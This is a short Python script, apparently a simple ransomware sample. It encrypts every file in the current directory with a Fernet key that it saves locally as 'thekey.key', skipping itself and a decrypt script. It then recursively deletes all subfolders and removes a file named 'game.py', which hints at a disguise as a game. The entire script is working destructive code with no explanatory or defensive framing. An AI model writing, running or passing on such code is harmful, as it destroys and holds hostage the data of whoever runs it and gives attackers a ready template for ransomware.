#!/usr/bin/env python3
'''
pip install cryptography
'''
import os
from cryptography.fernet import Fernet
import sys
import shutil


files = []
folders = []

for folder in os.listdir():
    if os.path.isfile(folder):
        continue
    else:
        folders.append(folder)
# For finding folders

for file in os.listdir():
    if file == "payback.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
# For finding files

print(files)
print(folders)

key = Fernet.generate_key()

with open("thekey.key","wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file,"rb") as thefile:
        contents = thefile.read()
    
    contents_encrypted = Fernet(key).encrypt(contents)

    with open(file,"wb") as thefile:
        thefile.write(contents_encrypted)

for folder in folders:
    shutil.rmtree(folder)

print("Goodbye! ")
os.remove("game.py")